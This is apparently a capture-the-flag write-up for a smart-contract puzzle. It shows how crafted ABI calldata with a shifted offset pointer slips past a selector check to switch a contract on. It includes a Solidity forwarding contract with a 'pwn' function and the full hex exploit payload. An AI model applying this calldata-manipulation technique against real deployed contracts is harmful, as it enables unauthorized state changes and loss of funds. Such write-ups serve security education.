### Goals

Turn switchOn

### Exploit

This riddle is one of my fav in whole CTF. We need to understand how calldata is being encoded.

Payload when calling `turnSwitchOff`:

```code
 Possible methods:
 - flipSwitch(bytes)
 ------------
 [000]: 0000000000000000000000000000000000000000000000000000000000000020
 [020]: 0000000000000000000000000000000000000000000000000000000000000004
 [040]: 20606e1500000000000000000000000000000000000000000000000000000000
```

The dynamic data (which bytes are) is encoded in special way. Since it is dynamic we need to store it's length. So we can see that at position [000] we have the pointer towards data length. Then we go to position below and digest 4 first bytes which are `flipSwitch` function signature.

How ever this level has instructions that extract function signature from some arbitrary location in calldata.
As you see below selector value is being assigned data starting at 68th byte of payload that have length of 4 bytes (signature).

```code
assembly {
    calldatacopy(selector, 68, 4) // grab function selector from calldata
}
```

We can build our custom payload that will still have encoded `turnOffSwitch` at this position but the pointer at the beginning will point towards `turnOnSwitch`.

```diff
+   [000]: 0000000000000000000000000000000000000000000000000000000000000060
    [020]: 0000000000000000000000000000000000000000000000000000000000000004
    [040]: 20606e1500000000000000000000000000000000000000000000000000000000
+   [060]: 0000000000000000000000000000000000000000000000000000000000000004
+   [080]: 76227e1200000000000000000000000000000000000000000000000000000000
```

### Code

Deploy contract in Remix

```code
contract TurnOn {
    address t = 0x358AA13c52544ECCEF6B0ADD0f801012ADAD5eE3;

    function pwn(bytes memory payload) external {
        t.call(payload);
    }
}
```

Deploy contract and call `pwn` with payload:

`0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000420606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000`

Done!
